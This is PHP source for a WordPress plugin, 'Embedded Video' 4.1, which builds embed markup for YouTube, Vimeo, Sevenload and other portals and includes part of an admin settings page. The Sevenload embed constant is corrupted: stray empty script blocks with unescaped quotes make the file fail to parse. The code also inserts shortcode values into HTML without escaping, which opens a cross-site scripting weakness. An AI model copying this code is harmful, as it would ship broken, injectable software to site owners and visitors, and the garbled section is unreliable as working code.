<?php

/*
Plugin Name: Embedded Video
Plugin URI: http://www.jovelstefan.de/embedded-video/
Description: Easy embedding of videos from various portals or local video files with corresponding link. <a href="options-general.php?page=embeddedvideo_options_page">Configure...</a>
Version: 4.1
License: GPL
Author: Stefan He&szlig;
Author URI: http://www.jovelstefan.de

Contact mail: jovelstefan@gmx.de
*/


// prevent plugin from being used with wp versions under 2.5; otherwise do nothing!
global $wp_db_version;
if ( $wp_db_version >= 7558 ) {

// prevent file from being accessed directly

if ('embedded-video.php' == basename($_SERVER['SCRIPT_FILENAME']))
	die ('Please do not access this file directly. Thanks!');

define("EV_VERSION", 41);

// initiate options and variables
function embeddedvideo_initialize() {
	add_option('embeddedvideo_prefix', "Direkt");
	add_option('embeddedvideo_space', "false");
	add_option('embeddedvideo_width', 425);
	add_option('embeddedvideo_small', "false");
	add_option('embeddedvideo_pluginlink', "true");
	add_option('embeddedvideo_version', EV_VERSION);
	add_option('embeddedvideo_shownolink', "false");
	add_option('embeddedvideo_showinfeed', "true");
    update_option('embeddedvideo_version', EV_VERSION);
}

if ('true' == get_option('embeddedvideo_space')) {
	$ev_space = '&nbsp;';
} else {
	$ev_space = '';
}

define("LINKTEXT", get_option('embeddedvideo_prefix').$ev_space);
define("GENERAL_WIDTH", get_option('embeddedvideo_width'));

/***********************/

// format definitions
define("YOUTUBE_HEIGHT", floor(GENERAL_WIDTH*14/17));
define("GOOGLE_HEIGHT", floor(GENERAL_WIDTH*14/17));
define("MYVIDEO_HEIGHT", floor(GENERAL_WIDTH*367/425));
define("CLIPFISH_HEIGHT", floor(GENERAL_WIDTH*95/116));
define("SEVENLOAD_HEIGHT", floor(GENERAL_WIDTH*408/500));
define("REVVER_HEIGHT", floor(GENERAL_WIDTH*49/60));
define("METACAFE_HEIGHT", floor(GENERAL_WIDTH*69/80));
define("YAHOO_HEIGHT", floor(GENERAL_WIDTH*14/17));
define("IFILM_HEIGHT", floor(GENERAL_WIDTH*365/448));
define("MYSPACE_HEIGHT", floor(GENERAL_WIDTH*173/215));
define("BRIGHTCOVE_HEIGHT", floor(GENERAL_WIDTH*206/243));
define("QUICKTIME_HEIGHT", floor(GENERAL_WIDTH*3/4));
define("VIDEO_HEIGHT", floor(GENERAL_WIDTH*3/4));
define("ANIBOOM_HEIGHT", floor(GENERAL_WIDTH*93/112));
define("FLASHPLAYER_HEIGHT", floor(GENERAL_WIDTH*93/112));
define("VIMEO_HEIGHT", floor(GENERAL_WIDTH*3/4));
define("GUBA_HEIGHT", floor(GENERAL_WIDTH*72/75));
define("DAILYMOTION_HEIGHT", floor(GENERAL_WIDTH*334/425));
define("GARAGE_HEIGHT", floor(GENERAL_WIDTH*289/430));
define("GAMEVIDEO_HEIGHT", floor(GENERAL_WIDTH*3/4));
define("VSOCIAL_HEIGHT", floor(GENERAL_WIDTH*40/41));
define("VEOH_HEIGHT", floor(GENERAL_WIDTH*73/90));
define("GAMETRAILERS_HEIGHT", floor(GENERAL_WIDTH*392/480));

// object targets and links
define("YOUTUBE_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://www.youtube.com/v/###VID###\" width=\"".GENERAL_WIDTH."\" height=\"".YOUTUBE_HEIGHT."\"><param name=\"movie\" value=\"http://www.youtube.com/v/###VID###\" /><param name=\"autostart\" value=\"true\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("YOUTUBE_LINK", "<a title=\"YouTube\" href=\"http://www.youtube.com/watch?v=###VID###\">YouTube ###TXT######THING###</a>");
define("GOOGLE_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://video.google.com/googleplayer.swf?docId=###VID###\" width=\"".GENERAL_WIDTH."\" height=\"".GOOGLE_HEIGHT."\"><param name=\"movie\" value=\"http://video.google.com/googleplayer.swf?docId=###VID###\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("GOOGLE_LINK", "<a title=\"Google Video\" href=\"http://video.google.com/videoplay?docid=###VID###\">Google ###TXT######THING###</a>");
define("MYVIDEO_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://www.myvideo.de/movie/###VID###\" width=\"".GENERAL_WIDTH."\" height=\"".MYVIDEO_HEIGHT."\"><param name=\"movie\" value=\"http://www.myvideo.de/movie/###VID###\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("MYVIDEO_LINK", "<a title=\"MyVideo\" href=\"http://www.myvideo.de/watch/###VID###\">MyVideo ###TXT######THING###</a>");
define("CLIPFISH_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://www.clipfish.de/videoplayer.swf?as=0&amp;videoid=###VID###&amp;r=1\" width=\"".GENERAL_WIDTH."\" height=\"".CLIPFISH_HEIGHT."\"><param name=\"movie\" value=\"http://www.clipfish.de/videoplayer.swf?as=0&amp;videoid=###VID###&amp;r=1\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("CLIPFISH_LINK", "<a title=\"Clipfish\" href=\"http://www.clipfish.de/player.php?videoid=###VID###\">Clipfish ###TXT######THING###</a>");
define("SEVENLOAD_TARGET", "<script type='text/javascript' src='http://sevenload.com/pl/###VID###/".GENERAL_WIDTH."x".SEVENLOAD_HEIGHT."'></script><script type="text/javascript">

</script><script type="text/javascript">

</script><script type="text/javascript">

</script><br />");
define("SEVENLOAD_LINK", "<a title=\"Sevenload\" href=\"http://sevenload.com/videos/###VID###\">Sevenload ###TXT######THING###</a>");
define("REVVER_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://flash.revver.com/player/1.0/player.swf?mediaId=###VID###\" width=\"".GENERAL_WIDTH."\" height=\"".REVVER_HEIGHT."\"><param name=\"movie\" value=\"http://flash.revver.com/player/1.0/player.swf?mediaId=###VID###\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("REVVER_LINK", "<a title=\"Revver\" href=\"http://one.revver.com/watch/###VID###\">Revver ###TXT######THING###</a>");
define("METACAFE_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://www.metacafe.com/fplayer/###VID###.swf\" width=\"".GENERAL_WIDTH."\" height=\"".METACAFE_HEIGHT."\"><param name=\"movie\" value=\"http://www.metacafe.com/fplayer/###VID###.swf\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("METACAFE_LINK", "<a title=\"Metacaf&eacute;\" href=\"http://www.metacafe.com/watch/###VID###\">Metacaf&eacute; ###TXT######THING###</a>");
define("YAHOO_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://us.i1.yimg.com/cosmos.bcst.yahoo.com/player/media/swf/FLVVideoSolo.swf?id=###VID###\" width=\"".GENERAL_WIDTH."\" height=\"".YAHOO_HEIGHT."\"><param name=\"movie\" value=\"http://us.i1.yimg.com/cosmos.bcst.yahoo.com/player/media/swf/FLVVideoSolo.swf?id=###VID###\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("YAHOO_LINK", "<a title=\"Yahoo! Video\" href=\"http://video.yahoo.com/video/play?vid=###YAHOO###.###VID###\">Yahoo! ###TXT######THING###</a>");
define("IFILM_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://www.ifilm.com/efp?flvbaseclip=###VID###\" width=\"".GENERAL_WIDTH."\" height=\"".IFILM_HEIGHT."\"><param name=\"movie\" value=\"http://www.ifilm.com/efp?flvbaseclip=###VID###\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("IFILM_LINK", "<a title=\"ifilm\" href=\"http://www.ifilm.com/video/###VID###\">ifilm ###TXT######THING###</a>");
define("MYSPACE_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://lads.myspace.com/videos/vplayer.swf?m=###VID###&amp;type=video\" width=\"".GENERAL_WIDTH."\" height=\"".MYSPACE_HEIGHT."\"><param name=\"movie\" value=\"http://lads.myspace.com/videos/vplayer.swf?m=###VID###&amp;type=video\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("MYSPACE_LINK", "<a title=\"MySpace Video\" href=\"http://vids.myspace.com/index.cfm?fuseaction=vids.individual&amp;videoid=###VID###\">MySpace ###TXT######THING###</a>");
define("BRIGHTCOVE_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://admin.brightcove.com/destination/player/player.swf?initVideoId=###VID###&amp;servicesURL=http://services.brightcove.com/services&amp;viewerSecureGatewayURL=https://services.brightcove.com/services/amfgateway&amp;cdnURL=http://admin.brightcove.com&amp;autoStart=false\" width=\"".GENERAL_WIDTH."\" height=\"".BRIGHTCOVE_HEIGHT."\"><param name=\"movie\" value=\"http://admin.brightcove.com/destination/player/player.swf?initVideoId=###VID###&amp;servicesURL=http://services.brightcove.com/services&amp;viewerSecureGatewayURL=https://services.brightcove.com/services/amfgateway&amp;cdnURL=http://admin.brightcove.com&amp;autoStart=false\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("BRIGHTCOVE_LINK", "<a title=\"brightcove\" href=\"http://www.brightcove.com/title.jsp?title=###VID###\">brightcove ###TXT######THING###</a>");
define("ANIBOOM_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://api.aniboom.com/embedded.swf?videoar=###VID###&amp;allowScriptAccess=sameDomain&amp;quality=high\" width=\"".GENERAL_WIDTH."\" height=\"".ANIBOOM_HEIGHT."\"><param name=\"movie\" value=\"http://api.aniboom.com/embedded.swf?videoar=###VID###&amp;allowScriptAccess=sameDomain&amp;quality=high\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("ANIBOOM_LINK", "<a title=\"aniBOOM\" href=\"http://www.aniboom.com/Player.aspx?v=###VID###\">aniBOOM ###TXT######THING###</a>");
define("VIMEO_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://www.vimeo.com/moogaloop.swf?clip_id=###VID###\" width=\"".GENERAL_WIDTH."\" height=\"".VIMEO_HEIGHT."\"><param name=\"movie\" value=\"http://www.vimeo.com/moogaloop.swf?clip_id=###VID###\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("VIMEO_LINK", "<a title=\"vimeo\" href=\"http://www.vimeo.com/clip:###VID###\">vimeo ###TXT######THING###</a>");
define("GUBA_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://www.guba.com/f/root.swf?video_url=http://free.guba.com/uploaditem/###VID###/flash.flv&amp;isEmbeddedPlayer=true\" width=\"".GENERAL_WIDTH."\" height=\"".GUBA_HEIGHT."\"><param name=\"movie\" value=\"http://www.guba.com/f/root.swf?video_url=http://free.guba.com/uploaditem/###VID###/flash.flv&amp;isEmbeddedPlayer=true\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("GUBA_LINK", "<a title=\"GUBA\" href=\"http://www.guba.com/watch/###VID###\">GUBA ###TXT######THING###</a>");
define("DAILYMOTION_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://www.dailymotion.com/swf/###VID###\" width=\"".GENERAL_WIDTH."\" height=\"".DAILYMOTION_HEIGHT."\"><param name=\"movie\" value=\"http://www.dailymotion.com/swf/###VID###\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("GARAGE_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://www.garagetv.be/v/###VID###/v.aspx\" width=\"".GENERAL_WIDTH."\" height=\"".GARAGE_HEIGHT."\"><param name=\"movie\" value=\"http://www.garagetv.be/v/###VID###/v.aspx\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("GAMEVIDEO_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://gamevideos.com:80/swf/gamevideos11.swf?embedded=1&amp;autoplay=0&amp;src=http://gamevideos.com:80/video/videoListXML%3Fid%3D###VID###%26adPlay%3Dfalse\" width=\"".GENERAL_WIDTH."\" height=\"".GAMEVIDEO_HEIGHT."\"><param name=\"movie\" value=\"http://gamevideos.com:80/swf/gamevideos11.swf?embedded=1&fullscreen=1&amp;autoplay=0&amp;src=http://gamevideos.com:80/video/videoListXML%3Fid%3D###VID###%26adPlay%3Dfalse\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("GAMEVIDEO_LINK", "<a title=\"GameVideos\" href=\"http://gamevideos.com/video/id/###VID###\">GameVideos ###TXT######THING###</a>");
define("VSOCIAL_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://static.vsocial.com/flash/ups.swf?d=###VID###&a=0\" width=\"".GENERAL_WIDTH."\" height=\"".VSOCIAL_HEIGHT."\"><param name=\"movie\" value=\"http://static.vsocial.com/flash/ups.swf?d=###VID###&a=0\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("VSOCIAL_LINK", "<a title=\"vSocial\" href=\"http://www.vsocial.com/video/?d=###VID###\">vSocial ###TXT######THING###</a>");
define("VEOH_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://www.veoh.com/videodetails2.swf?player=videodetailsembedded&type=v&permalinkId=###VID###&id=anonymous\" width=\"".GENERAL_WIDTH."\" height=\"".VEOH_HEIGHT."\"><param name=\"movie\" value=\"http://www.veoh.com/videodetails2.swf?player=videodetailsembedded&type=v&permalinkId=###VID###&id=anonymous\" /><param name=\"autostart\" value=\"true\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("VEOH_LINK", "<a title=\"Veoh\" href=\"http://www.veoh.com/videos/###VID###\">Veoh ###TXT######THING###</a>");
define("GAMETRAILERS_TARGET", "<object type=\"application/x-shockwave-flash\" data=\"http://www.gametrailers.com/remote_wrap.php?mid=###VID###\" width=\"".GENERAL_WIDTH."\" height=\"".GAMETRAILERS_HEIGHT."\"><param name=\"movie\" value=\"http://www.gametrailers.com/remote_wrap.php?mid=###VID###\" /><param name=\"autostart\" value=\"true\" /><param name=\"wmode\" value=\"transparent\" /></object><br />");
define("GAMETRAILERS_LINK", "<a title=\"Gametrailers\" href=\"http://www.gametrailers.com/player/###VID###.html\">Gametrailers ###TXT######THING###</a>");

define("LOCAL_QUICKTIME_TARGET", "<object classid=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\" codebase=\"http://www.apple.com/qtactivex/qtplugin.cab\" width=\"".GENERAL_WIDTH."\" height=\"".QUICKTIME_HEIGHT."\"><param name=\"src\" value=\"".get_option('siteurl')."###VID###\" /><param name=\"autoplay\" value=\"false\" /><param name=\"pluginspage\" value=\"http://www.apple.com/quicktime/download/\" /><param name=\"controller\" value=\"true\" /><!--[if !IE]> <--><object data=\"".get_option('siteurl')."###VID###\" width=\"".GENERAL_WIDTH."\" height=\"".QUICKTIME_HEIGHT."\" type=\"video/quicktime\"><param name=\"pluginurl\" value=\"http://www.apple.com/quicktime/download/\" /><param name=\"controller\" value=\"true\" /><param name=\"autoplay\" value=\"false\" /></object><!--> <![endif]--></object><br />");
define("LOCAL_FLASHPLAYER_TARGET", "<object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0\" width=\"".GENERAL_WIDTH."\" height=\"".FLASHPLAYER_HEIGHT."\"><param value=\"#FFFFFF\" name=\"bgcolor\" /><param name=\"movie\" value=\"".get_option('siteurl')."/wp-content/plugins/embedded-video-with-link/mediaplayer/player.swf\" /><param value=\"file=".get_option('siteurl')."###VID###&amp;showdigits=true&amp;autostart=false&amp;overstretch=false&amp;showfsbutton=false\" name=\"flashvars\" /><param name=\"wmode\" value=\"transparent\" /><!--[if !IE]> <--><object data=\"".get_option('siteurl')."/wp-content/plugins/embedded-video-with-link/mediaplayer/player.swf\" type=\"application/x-shockwave-flash\" height=\"".FLASHPLAYER_HEIGHT."\" width=\"".GENERAL_WIDTH."\"><param value=\"#FFFFFF\" name=\"bgcolor\"><param value=\"file=".get_option('siteurl')."###VID###&amp;showdigits=true&amp;autostart=false&amp;overstretch=false&amp;showfsbutton=false\" name=\"flashvars\" /><param name=\"wmode\" value=\"transparent\" /></object><!--> <![endif]--></object><br />");
define("LOCAL_TARGET", "<object classid=\"clsid:22D6f312-B0F6-11D0-94AB-0080C74C7E95\" codebase=\"http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#Version=6,4,7,1112\" width=\"".GENERAL_WIDTH."\" height=\"".VIDEO_HEIGHT."\" type=\"application/x-oleobject\"><param name=\"filename\" value=\"".get_option('siteurl')."###VID###\" /><param name=\"autostart\" value=\"false\" /><param name=\"showcontrols\" value=\"true\" /><!--[if !IE]> <--><object data=\"".get_option('siteurl')."###VID###\" width=\"".GENERAL_WIDTH."\" height=\"".VIDEO_HEIGHT."\" type=\"application/x-mplayer2\"><param name=\"pluginurl\" value=\"http://www.microsoft.com/Windows/MediaPlayer/\" /><param name=\"ShowControls\" value=\"true\" /><param name=\"ShowStatusBar\" value=\"true\" /><param name=\"ShowDisplay\" value=\"true\" /><param name=\"Autostart\" value=\"0\" /></object><!--> <![endif]--></object><br />");
define("LOCAL_LINK", "<a title=\"Video File\" href=\"".get_option('siteurl')."###VID###\">Download Video</a>");

define("QUICKTIME_TARGET", "<object classid=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\" codebase=\"http://www.apple.com/qtactivex/qtplugin.cab\" width=\"".GENERAL_WIDTH."\" height=\"".QUICKTIME_HEIGHT."\"><param name=\"src\" value=\"###VID###\" /><param name=\"autoplay\" value=\"false\" /><param name=\"pluginspage\" value=\"http://www.apple.com/quicktime/download/\" /><param name=\"controller\" value=\"true\" /><!--[if !IE]> <--><object data=\"###VID###\" width=\"".GENERAL_WIDTH."\" height=\"".QUICKTIME_HEIGHT."\" type=\"video/quicktime\"><param name=\"pluginurl\" value=\"http://www.apple.com/quicktime/download/\" /><param name=\"controller\" value=\"true\" /><param name=\"autoplay\" value=\"false\" /></object><!--> <![endif]--></object><br />");
define("FLASHPLAYER_TARGET", "<object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0\" width=\"".GENERAL_WIDTH."\" height=\"".FLASHPLAYER_HEIGHT."\"><param value=\"#FFFFFF\" name=\"bgcolor\" /><param name=\"movie\" value=\"".get_option('siteurl')."/wp-content/plugins/embedded-video-with-link/mediaplayer/player.swf\" /><param value=\"file=###VID###&amp;showdigits=true&amp;autostart=false&amp;overstretch=false&amp;showfsbutton=false\" name=\"flashvars\" /><param name=\"wmode\" value=\"transparent\" /><!--[if !IE]> <--><object data=\"".get_option('siteurl')."/wp-content/plugins/embedded-video-with-link/mediaplayer/player.swf?file=###VID###\" type=\"application/x-shockwave-flash\" height=\"".FLASHPLAYER_HEIGHT."\" width=\"".GENERAL_WIDTH."\"><param value=\"#FFFFFF\" name=\"bgcolor\"><param value=\"file=###VID###&amp;showdigits=true&amp;autostart=false&amp;overstretch=false&amp;showfsbutton=false\" name=\"flashvars\"><param name=\"wmode\" value=\"transparent\" /></object><!--> <![endif]--></object><br />");
define("VIDEO_TARGET", "<object classid=\"clsid:22D6f312-B0F6-11D0-94AB-0080C74C7E95\" codebase=\"http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#Version=6,4,7,1112\" width=\"".GENERAL_WIDTH."\" height=\"".VIDEO_HEIGHT."\" type=\"application/x-oleobject\"><param name=\"filename\" value=\"###VID###\" /><param name=\"autostart\" value=\"false\" /><param name=\"showcontrols\" value=\"true\" /><!--[if !IE]> <--><object data=\"###VID###\" width=\"".GENERAL_WIDTH."\" height=\"".VIDEO_HEIGHT."\" type=\"application/x-mplayer2\"><param name=\"pluginurl\" value=\"http://www.microsoft.com/Windows/MediaPlayer/\" /><param name=\"ShowControls\" value=\"true\" /><param name=\"ShowStatusBar\" value=\"true\" /><param name=\"ShowDisplay\" value=\"true\" /><param name=\"Autostart\" value=\"0\" /></object><!--> <![endif]--></object><br />");
define("VIDEO_LINK", "<a title=\"Video File\" href=\"###VID###\">Download Video</a>");

// regular expressions
define("REGEXP_1", "/\[(google|youtube|myvideo|clipfish|sevenload|revver|metacafe|yahoo|ifilm|myspace|brightcove|aniboom|vimeo|guba|dailymotion|garagetv|gamevideo|vsocial|veoh|gametrailers|local|video) ([[:graph:]]+) (nolink)\]/");
define("REGEXP_2", "/\[(google|youtube|myvideo|clipfish|sevenload|revver|metacafe|yahoo|ifilm|myspace|brightcove|aniboom|vimeo|guba|dailymotion|garagetv|gamevideo|vsocial|veoh|gametrailers|local|video) ([[:graph:]]+) ([[:print:]]+)\]/");
define("REGEXP_3", "/\[(google|youtube|myvideo|clipfish|sevenload|revver|metacafe|yahoo|ifilm|myspace|brightcove|aniboom|vimeo|guba|dailymotion|garagetv|gamevideo|vsocial|veoh|gametrailers|local|video) ([[:graph:]]+)\]/");

// logic
function embeddedvideo_plugin_callback($match) {
	$output = '';
	// insert plugin link
	if ((!is_feed())&&('true' == get_option('embeddedvideo_pluginlink'))) $output .= '<small>'.__('embedded by','embeddedvideo').' <a href="http://wordpress.org/extend/plugins/embedded-video-with-link/" title="'.__('plugin page','embeddedvideo').'"><em>Embedded Video</em></a></small><br />';
	if (!is_feed()) {
		switch ($match[1]) {
			case "youtube": $output .= YOUTUBE_TARGET; break;
			case "google": $output .= GOOGLE_TARGET; break;
			case "myvideo": $output .= MYVIDEO_TARGET; break;
			case "clipfish": $output .= CLIPFISH_TARGET; break;
			case "sevenload": $output .= SEVENLOAD_TARGET; break;
			case "revver": $output .= REVVER_TARGET; break;
			case "metacafe": $output .= METACAFE_TARGET; break;
			case "yahoo": $output .= YAHOO_TARGET; break;
			case "ifilm": $output .= IFILM_TARGET; break;
			case "myspace": $output .= MYSPACE_TARGET; break;
			case "brightcove": $output .= BRIGHTCOVE_TARGET; break;
			case "aniboom": $output .= ANIBOOM_TARGET; break;
			case "vimeo": $output .= VIMEO_TARGET; break;
			case "guba": $output .= GUBA_TARGET; break;
			case "gamevideo": $output .= GAMEVIDEO_TARGET; break;
			case "vsocial": $output .= VSOCIAL_TARGET; break;
			case "dailymotion": $output .= DAILYMOTION_TARGET; $match[3] = "nolink"; break;
			case "garagetv": $output .= GARAGE_TARGET; $match[3] = "nolink"; break;
			case "veoh": $output .= VEOH_TARGET; break;
			case "gametrailers": $output .= GAMETRAILERS_TARGET; break;
			case "local":
				if (preg_match("%([[:print:]]+).(mov|qt|MOV|QT)$%", $match[2])) { $output .= LOCAL_QUICKTIME_TARGET; break; }
				elseif (preg_match("%([[:print:]]+).(wmv|mpg|mpeg|mpe|asf|asx|wax|wmv|wmx|avi|WMV|MPG|MPEG|MPE|ASF|ASX|WAX|WMV|WMX|AVI)$%", $match[2])) { $output .= LOCAL_TARGET; break; }
				elseif (preg_match("%([[:print:]]+).(swf|flv|SWF|FLV)$%", $match[2])) { $output .= LOCAL_FLASHPLAYER_TARGET; break; }
			case "video":
				if (preg_match("%([[:print:]]+).(mov|qt|MOV|QT)$%", $match[2])) { $output .= QUICKTIME_TARGET; break; }
				elseif (preg_match("%([[:print:]]+).(wmv|mpg|mpeg|mpe|asf|asx|wax|wmv|wmx|avi|WMV|MPG|MPEG|MPE|ASF|ASX|WAX|WMV|WMX|AVI)$%", $match[2])) { $output .= VIDEO_TARGET; break; }
				elseif (preg_match("%([[:print:]]+).(swf|flv|SWF|FLV)$%", $match[2])) { $output .= FLASHPLAYER_TARGET; break; }
			default: break;
		}
		if (get_option('embeddedvideo_shownolink')=='false') {
			if ($match[3] != "nolink") {
				$ev_small = get_option('embeddedvideo_small');
				if ('true' == $ev_small) $output .= "<small>";
				switch ($match[1]) {
					case "youtube": $output .= YOUTUBE_LINK; break;
					case "google": $output .= GOOGLE_LINK; break;
					case "myvideo": $output .= MYVIDEO_LINK; break;
					case "clipfish": $output .= CLIPFISH_LINK; break;
					case "sevenload": $output .= SEVENLOAD_LINK; break;
					case "revver": $output .= REVVER_LINK; break;
					case "metacafe": $output .= METACAFE_LINK; break;
					case "yahoo": $output .= YAHOO_LINK; break;
					case "ifilm": $output .= IFILM_LINK; break;
					case "myspace": $output .= MYSPACE_LINK; break;
					case "brightcove": $output .= BRIGHTCOVE_LINK; break;
					case "aniboom": $output .= ANIBOOM_LINK; break;
					case "vimeo": $output .= VIMEO_LINK; break;
					case "guba": $output .= GUBA_LINK; break;
					case "gamevideo": $output .= GAMEVIDEO_LINK; break;
					case "vsocial": $output .= VSOCIAL_LINK; break;
					case "veoh": $output .= VEOH_LINK; break;
					case "gametrailers": $output .= GAMETRAILERS_LINK; break;
					case "local": $output .= LOCAL_LINK; break;
					case "video": $output .= VIDEO_LINK; break;
					default: break;
				}
				if ('true' == $ev_small) $output .= "</small>";
			}
		}
	} else if (get_option('embeddedvideo_showinfeed')=='true') $output .= __('[There is a video that cannot be displayed in this feed. ', 'embeddedvideo').'<a href="'.get_permalink().'">'.__('Visit the blog entry to see the video.]','embeddedvideo').'</a>';

	// postprocessing
	// first replace linktext
	$output = str_replace("###TXT###", LINKTEXT, $output);
	// special handling of Yahoo! Video IDs
	if ($match[1] == "yahoo") {
		$temp = explode(".", $match[2]);
		$match[2] = $temp[1];
		$output = str_replace("###YAHOO###", $temp[0], $output);
	}
	// replace video IDs and text
	$output = str_replace("###VID###", $match[2], $output);
	$output = str_replace("###THING###", $match[3], $output);
	// add HTML comment
	if (!is_feed()) $output .= "\n<!-- generated by WordPress plugin Embedded Video -->\n";
	return ($output);
}

// actual plugin function
function embeddedvideo_plugin($content) {
	$output = preg_replace_callback(REGEXP_1, 'embeddedvideo_plugin_callback', $content);
    $output = preg_replace_callback(REGEXP_2, 'embeddedvideo_plugin_callback', $output);
    $output = preg_replace_callback(REGEXP_3, 'embeddedvideo_plugin_callback', $output);
	return ($output);
}

// required filters
add_filter('the_content', 'embeddedvideo_plugin');
//add_filter('comment_text', 'embeddedvideo_plugin');

//build admin interface
function embeddedvideo_option_page() {

global $wpdb, $table_prefix;

	if ( isset($_POST['embeddedvideo_prefix']) ) {

		$errs = array();

		$temp = stripslashes($_POST['embeddedvideo_prefix']);
		$ev_prefix = wp_kses($temp, array());

		update_option('embeddedvideo_prefix', $ev_prefix);

		if (!empty($_POST['embeddedvideo_space'])) {
			update_option('embeddedvideo_space', "true");
		} else {
			update_option('embeddedvideo_space', "false");
		}

		if (!empty($_POST['embeddedvideo_small'])) {
			update_option('embeddedvideo_small', "true");
		} else {
			update_option('embeddedvideo_small', "false");
		}

		if (!empty($_POST['embeddedvideo_pluginlink'])) {
			update_option('embeddedvideo_pluginlink', "true");
		} else {
			update_option('embeddedvideo_pluginlink', "false");
		}

		if (!empty($_POST['embeddedvideo_shownolink'])) {
			update_option('embeddedvideo_shownolink', "true");
		} else {
			update_option('embeddedvideo_shownolink', "false");
		}

		if (!empty($_POST['embeddedvideo_showinfeed'])) {
			update_option('embeddedvideo_showinfeed', "true");
		} else {
			update_option('embeddedvideo_showinfeed', "false");
		}

		$ev_width = $_POST['embeddedvideo_width'];
		if ($ev_width == "") $errs[] = __('Object width must be set!','embeddedvideo');
		elseif (($ev_width>800)||($ev_width<250)||(!preg_match("/^[0-9]{3}$/", $ev_width))) $errs[] = __('Object width must be a number between 250 and 800!','embeddedvideo');
		else update_option('embeddedvideo_width', $ev_width);

		if ( empty($errs) ) {
			echo '<div id="message" class="updated fade"><p>'.__('Options updated!','embeddedvideo').'</p></div>';
		} else {
			echo '<div id="message" class="error fade"><ul>';
			foreach ( $errs as $name => $msg ) {
				echo '<li>'.wptexturize($msg).'</li>';
			}
			echo '</ul></div>';
		}
	}

	if ('true' == get_option('embeddedvideo_space')) {
		$ev_space = 'checked="true"';
	} else {
		$ev_space = '';
	}

	if ('true' == get_option('embeddedvideo_small')) {
		$ev_small = 'checked="true"';
	} else {
		$ev_small = '';
	}

	if ('true' == get_option('embeddedvideo_pluginlink')) {
		$ev_pluginlink = 'checked="true"';
	} else {
		$ev_pluginlink = '';
	}

	if ('true' == get_option('embeddedvideo_shownolink')) {
		$ev_shownolink = 'checked="true"';
	} else {
		$ev_shownolink = '';
	}

	if ('true' == get_option('embeddedvideo_showinfeed')) {
		$ev_showinfeed = 'checked="true"';
	} else {
		$ev_showinfeed = '';
	}
	?>

	<div style="width:75%;" class="wrap" id="embeddedvideo_options_panel">
	<h2><?php echo _e('Embedded Video','embeddedvideo'); ?></h2>

	<a href="http://www.oscandy.com/"><img src="/wp-content/plugins/embedded-video-with-link/embedded-video-logo.png" title="<?php echo _e('Logo by Azzam/OpenSource Solutions Blog') ?>" alt="<?php echo _e('Logo by Azzam/OpenSource Solutions Blog') ?>" align="right" /></a>

	<p><strong><?php echo _e('Edit the prefix of the linktext and the width of the embedded flash object!','embeddedvideo'); ?></strong><br /><?php echo _e('For detailed information see the','embeddedvideo'); ?> <a href="http://wordpress.org/extend/plugins/embedded-video-with-link/" title="<?php echo _e('plugin page','embeddedvideo'); ?>"><?php echo _e('plugin page','embeddedvideo'); ?></a>.</p>

	<p><i><?php echo _e('Examples for the prefix settings:','embeddedvideo'); ?></i><br />
	<?php echo _e('If you type in','embeddedvideo'); ?> <strong>[youtube abcd12345 super video]</strong> <?php echo _e('and you choose the prefix','embeddedvideo'); ?> <strong>"<?php echo _e('- Link to','embeddedvideo'); ?>"</strong> <?php echo _e('with a following space, the linktext will be','embeddedvideo'); ?> <strong>"<?php echo _e('YouTube - Link to super video','embeddedvideo'); ?>"</strong>.<br /><br />
	<?php echo _e('If you type in','embeddedvideo'); ?> <strong>[sevenload abcd12345 dings]</strong> <?php echo _e('and you choose the prefix','embeddedvideo'); ?> <strong>"<?php echo _e('Direct','embeddedvideo'); ?>"</strong> <?php echo _e('without a following space, the linktext will be','embeddedvideo'); ?> <strong>"<?php echo _e('Sevenload Directdings','embeddedvideo'); ?>"</strong>.</p>
	<div class="wrap">
		<form method="post">
			<div>
